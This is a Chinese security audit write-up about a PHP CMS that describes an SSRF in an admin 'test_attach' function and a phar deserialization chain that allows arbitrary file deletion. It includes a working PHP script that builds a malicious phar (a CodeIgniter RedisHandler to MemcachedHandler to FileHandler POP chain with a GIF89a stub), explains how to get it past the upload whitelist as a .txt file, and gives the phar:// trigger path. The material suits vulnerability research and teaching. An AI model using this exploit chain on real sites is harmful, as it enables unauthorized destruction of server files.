SSRF漏洞原理
========

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种安全漏洞，攻击者通过引诱服务器发起请求到内部系统或者网络中的其他服务器。SSRF漏洞的发生是因为服务端提供了从外部系统获取数据的功能，但是没有对请求进行合适的限制，导致攻击者可以指定请求的目标，并可能获取到内部网络的数据。

概述
==

一开始心血来潮想审计PHP系统，于是网上找了找一些开源比较知名的系统，于是找到了某CMS最新版，通过观察最近好像没出过什么大洞，于是想审计一下，跟随之前大佬挖漏洞的思路，尝试挖掘一下最新版的漏洞。其中会涉及到一些漏洞基础原理，关键部分会进行模糊处理，希望各位大佬理解，菜鸡一枚，勿喷/(ㄒoㄒ)/~~ 下面开始审计分析

### `dr_catcher_data`

这里我们定位到`/Fcms/Core/Helper.php`  
函数部分代码

```php
* 调用远程数据 curl获取
 *
 * @param   $url
 * @param   $timeout 超时时间，0不超时
 * @param   $is_log 0表示请求失败不记录到系统日志中
 * @param   $ct 0表示不尝试重试，1表示重试一次
 * @return  请求结果值
 */
function dr_catcher_data($url, $timeout = 0, $is_log = true, $ct = 0) {

    if (!$url) {
        return '';
    }

    // 获取本地文件
    if (strpos($url, 'file://')  === 0) {
        return file_get_contents($url);
    } elseif (strpos($url, '/')  === 0 &amp;&amp; is_file(WEBPATH.$url)) {
        return file_get_contents(WEBPATH.$url);
    } elseif (!dr_is_url($url)) {
        if (CI_DEBUG &amp;&amp; $is_log) {
            log_message('error', '获取远程数据失败['.$url.']：地址前缀要求是http开头');
        }
        return '';
    }
```

触发SSRF漏洞点
---------

### `test_attach`

`/Fms/Control/Admin/Api.php` `test\_attach`  
下面是代码部分

```php
/**
     * 测试远程附件
     */
    public function test_attach() {

        $data = \Phpcmf\Service::L('input')-&gt;post('data');
        if (!$data) {
            $this-&gt;_json(0, dr_lang('参数错误'));
        }

        $type = intval($data['type']);
        $value = $data['value'][$type];
        if (!$value) {
            $this-&gt;_json(0, dr_lang('参数不存在'));
        } elseif ($type == 0) {
            if (substr($value['path'],-1, 1) != '/') {
                $this-&gt;_json(0, dr_lang('存储路径目录一定要以“/”结尾'));
            } elseif ((dr_strpos($value['path'], '/') === 0 || dr_strpos($value['path'], ':') !== false)) {
                if (!is_dir($value['path'])) {
                    $this-&gt;_json(0, dr_lang('本地路径[%s]不存在', $value['path']));
                }
            } elseif (is_dir(SYS_UPLOAD_PATH.$value['path'])) {

            } else {
                $this-&gt;_json(0, dr_lang('本地路径[%s]不存在', SYS_UPLOAD_PATH.$value['path']));
            }
        } 

        $rt = \Phpcmf\Service::L('upload')-&gt;save_file(
            'content',
            'this is phpcmf file-test',
            'test/test.txt',
            [
                'id' =&gt; 0,
                'url' =&gt; $data['url'],
                'type' =&gt; $type,
                'value' =&gt; $value,
            ]
        );

        if (!$rt['code']) {
            $this-&gt;_json(0, $rt['msg']);
        } elseif (strpos(dr_catcher_data($rt['data']['url']), 'phpcmf') !== false) {
            $this-&gt;_json(1, dr_lang('测试成功：%s', $rt['data']['url']));
        }

        $this-&gt;_json(0, dr_lang('无法访问到附件: %s', $rt['data']['url']));
    }
```

分析得到，下面

```php
$data = \Phpcmf\Service::L('input')-&gt;post('data');
elseif (strpos(dr_catcher_data($rt['data']['url']), 'phpcmf') !== false)
```

`POST`请求中，`data['url']` 途中没有任何过滤 就给到了 `dr_catcher_data()`函数，但是`dr_catcher_data`函数可以处理`file`，`Http`等协议的函数封装。如封装了,`file_get_contents`、`curl_exec`等。造成了`SSRF`的漏洞

反序列化
====

任意文件删除
------

phar反序列化漏洞点
-----------

我们直接找 文件函数：`is_dir`，`file_exist`等等

在源码路径：`/Fms/Control/Admin/Api.php`里面

其实很多个功能都存在`phar`反序列化触发点

### test\_attach

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-0d8f6563d59b6b89ed20416952228cad80f32c05.png)

### test\_attach\_domain

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-42411507aaf4fdd85e9ed2e5785a637ecd1b5186.png)  
后面主要是以：`test_attach_domain`来作利用

POP查找
-----

### 链一（失败）

#### 序列化代码

```php
需要第一类来new一下
namespace CodeIgniter\Publisher;

class Publisher
{
    public $scratch = "../1";
    //通过__destruct触发 delete scratch
    //通过new 对象 触发__construct helper('filesystem')，因为deltete用到了filesystem方法。
}

namespace CodeIgniter\Cache\Handlers;
class  MemcachedHandler
{

     public $prefix;
     public __construct()
     {
        this-&gt;$prefix = new CodeIgniter\Publisher\Publisher(); //触发构造方法 和 销毁方法
     }

}

var_dump(serialize(new  MemcachedHandler()))
```

#### POP链

```php
Publisher：construc.helper(['filesystem'])->destruct()-> wipeDirectory()->delete_files()
```

`detele_files()`函数 需要由引入 `helper(['filesystem'])`;  
思路：通过 `MemcachedHandler` 任意属性 调用`new Publisher`触发 `helper('filesystem')`引入`delete_files()`类

#### 分析

先看看几个重要的方法（简化）

##### `Publisher`

`_construct方法()`

```php
helper(['filesystem']);
```

`_destruct()方法`

```php
public function __destruct()
    {
            self::wipeDirectory($this-&gt;scratch);
    }
```

`wipeDirectory`方法

```php
private static function wipeDirectory(string $directory): void
    {
            $attempts = 10;

           while ((bool) $attempts &amp;&amp; ! delete_files($directory, true, false, true)) {
                $attempts--;
            }
            @rmdir($directory);
    }
```

#### 失败原因

显示delete\_files()不存在  
![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-fc1c7c2d8d786770807846398ede8f073f0ee827.png)

#### 总结

反序列化过程，不会创建对象。不管序列化中new在何处，也只是告诉解析器 new这个位置 需要替换 该类型对象的属性。

反序列化原理：创建空对象，把属性值传递进去（本质，属性替换）

### 链子二

#### 序列化代码

```php
&lt;?php
//=======实现delete方法有，unlink(this-&gt;$path.$this-&gt;prefix.$lockkey)
namespace CodeIgniter\Cache\Handlers;
class FileHandler
{
    public $prefix;
    public $path;
    public function __construct()
    {
        $this-&gt;prefix='';
        $this-&gt;path='';
    }
}

//=======MemcachedHandler中close()有$this-&gt;memcached-&gt;delete($this-&gt;lockKey)
namespace CodeIgniter\Session\Handlers;
class MemcachedHandler
{
    public $lockKey;  //传入delete()的值
    public $memcached;
    public function __construct()
    {           
        //$this-&gt;memcached-&gt;detele($this-&gt;lockKey);
        $this-&gt;lockKey = "D:\\phpstudy_pro\\WWW\\test.test"; //文件路径
        $this-&gt;memcached = new  \CodeIgniter\Cache\Handlers\FileHandler();  //触发下一个delete

    }

}

//==========RedisHandler中destruct有this-&gt;redis-&gt;close()
namespace CodeIgniter\Cache\Handlers;
class RedisHandler
{
     public $redis;
     public function __construct()
     {
        $this-&gt;redis = new \CodeIgniter\Session\Handlers\MemcachedHandler(); //指向MemcachedHandler对象
     }
    //因为后续有 this-&gt;redis-&gt;close()操作，可以用MemcachedHandler的close函数。
}

$o = new new RedisHandler());
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
$phar-&gt;stopBuffering(); //签名自动计算

?&gt;
```

#### 序列化字符串

```php
string(275) "O:39:"CodeIgniter\Cache\Handlers\RedisHandler":1:{s:5:"redis";O:45:"CodeIgniter\Session\Handlers\MemcachedHandler":2:{s:9:"memcached";O:38:"CodeIgniter\Cache\Handlers\FileHandler":2:{s:6:"prefix";s:0:"";s:4:"path";s:0:"";}s:7:"lockKey";s:29:"D:\phpstudy_pro\WWW\test.test";}}"
```

#### POP链

```php
RedisHandler __destruct()  -&gt;   MemcachedHandler close()  -&gt; FileHandler delete()
```

#### 分析

##### RedisHandler

\_\_destruct

调用了$this-&gt;redis-&gt;close()

```php
public function __destruct()
    {
        if (isset($this-&gt;redis)) {
            $this-&gt;redis-&gt;close();
        }
    }
```

redis改为 MemcachedHandle对象

##### MemcachedHandler

实现close()

```php
public function close(): bool
    {
        if (isset($this-&gt;memcached)) {
            if (isset($this-&gt;lockKey)) {
                $this-&gt;memcached-&gt;delete($this-&gt;lockKey);
            }

            if (! $this-&gt;memcached-&gt;quit()) {
                return false;
            }

            $this-&gt;memcached = null;

            return true;
        }

        return false;
    }
```

找`delete`，存在 `$this->memcached->delete($this->lockKey)`

##### `FileHandler`

```php
namespace CodeIgniter\Cache\Handlers;

   public function delete(string $key)
    {
        $key = static::validateKey($key, $this-&gt;prefix);

        return is_file($this-&gt;path . $key) &amp;&amp; unlink($this-&gt;path . $key);
    }
```

实现了 unlink文件删除的功能，路径构成：`$this->path->$key->$this->prefix`  
`$key`由外部传进来的，为了方便控制，我们直接让外部的`$key`为删除文件路径。`path`和`prefix`为空即可。  
同时，`$key`为 `MemcachedHandler`的`lockKey`

#### 总结

找`POP`链的时候，需要无限套娃，一个对象套一个对象。可以利用的类一般是需要有命名空间。我们第一步找到 `destruct`方法，看看`destruct`观察：可控变量与方法。 第二步：1.根据方法，全局搜索实现的类 2.根据方法传入参数个数类型，全局找到使用`__call`魔术方法的类进行分析。第三步，无限套娃 找到能够触发我们目标功能（RCE，任意文件删除，任意文件写入等等）

Phar反序列化任意文件删除利用
----------------

准备工作
----

漏洞点在 Controler/Admin/Api.php

```php
http://xunruicms-study/admina516ce184c2e.php?c=Api&amp;m=test_attach_domain
```

```php
phar://D:/phpstudy_pro/WWW/phar.jpg/test.txt
```

生成`phar`利用文件脚本

```php
&lt;?php
//=======实现delete方法有，unlink(this-&gt;$path.$this-&gt;prefix.$lockkey)
namespace CodeIgniter\Cache\Handlers;
class FileHandler
{
    public $prefix;
    public $path;
    public function __construct()
    {
        $this-&gt;prefix='';
        $this-&gt;path='';
    }
}

//=======MemcachedHandler中close()有$this-&gt;memcached-&gt;delete($this-&gt;lockKey)
namespace CodeIgniter\Session\Handlers;
class MemcachedHandler
{
    public $lockKey;  //传入delete()的值
    public $memcached;
    public function __construct()
    {           
        //$this-&gt;memcached-&gt;detele($this-&gt;lockKey);
        $this-&gt;lockKey = "D:\\phpstudy_pro\\WWW\\test.test"; //删除的文件路径
        $this-&gt;memcached = new  \CodeIgniter\Cache\Handlers\FileHandler();  //触发下一个delete

    }

}

//==========RedisHandler中destruct有this-&gt;redis-&gt;close()
namespace CodeIgniter\Cache\Handlers;

use Phar;

class RedisHandler
{
     public $redis;
     public function __construct()
     {
        $this-&gt;redis = new \CodeIgniter\Session\Handlers\MemcachedHandler(); //指向MemcachedHandler对象
     }
    //因为后续有 this-&gt;redis-&gt;close()操作，可以用MemcachedHandler的close函数。
}

$o =  new RedisHandler();
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
$phar-&gt;stopBuffering(); //签名自动计算
?&gt;
```

利用过程
----

### `phar`文件上传点

（原本想试试头像上传的，发现文件被压缩，就找了个上传附件的位置）

```php
http://xunruicms-study/index.php?s=member&amp;app=news&amp;c=home&amp;m=add
```

第一步，来到文章发布的后台（需要有附件上传权限）  
发布内容中，下面有个附件上传  
![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-5a63e145a93e31f1ff057608aa9e25e14b370b88.png)  
这里可以显示上传的内容（zip,rar,txt,doc），我们只需要把phar.phar包 该后缀满足白名单就行，我改为phar.txt

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-9d9bf4b7f540e505cff4a7a3ed0c7c6e45a65cd8.png)  
点击上传后的附件，会弹出一个url。我们只需要拿到 `/upload` 后面的构造`phar://`语句

```php
phar://uploadfile/202407/de5d2812b5ba390.txt/test.txt
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-09b3bd29da1d9855b304bc8d87f908f09ae01818.png)

### Phar反序列化点

`备注`：`test\_attach\_domain`函数作为利用点。  
需要反序列化执行的命令

```php
phar://uploadfile/202407/de5d2812b5ba390.txt/test.txt
```

到这边，需要选择完整模式 -&gt; 系统附件设置 -&gt; 附件上传目录（输入我们的命令) 点击检测  
![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-f1e45496f648a4c6c647df091b7fe862706196b0.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20240801131323-c6d337ba-4fc4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240801131323-c6d337ba-4fc4-1.png)  
反序列化出来了我们的FileHandler对象，说明反序列化攻击成功，我们的文件也成功被删除  
![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-5683c23629555ecdcdce62c36b254a542ee3fb5f.png)